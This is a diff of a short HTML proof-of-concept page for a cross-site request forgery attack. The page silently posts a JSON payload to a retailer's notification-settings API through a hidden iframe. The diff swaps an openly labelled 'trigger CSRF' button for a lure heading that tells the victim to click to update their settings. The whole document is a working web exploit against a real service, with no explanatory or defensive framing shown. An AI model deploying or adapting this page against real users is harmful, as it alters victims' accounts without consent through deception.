@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <h3>Click the button below to update your notification settings</h3>
+
     <form id="csrfForm" action="https://www.temu.com/api/bg-barbera-api/setting/notification/configure" method="POST" target="csrfFrame">
       <input type="hidden" name='{"id":100,"status":1}' value="">
+      <button type="submit">Submit</button>
     </form>
 
     <iframe name="csrfFrame" style="display:none;"></iframe>
-
-    <button onclick="document.getElementById('csrfForm').submit()">Click to trigger CSRF</button>
   </body>
 </html>
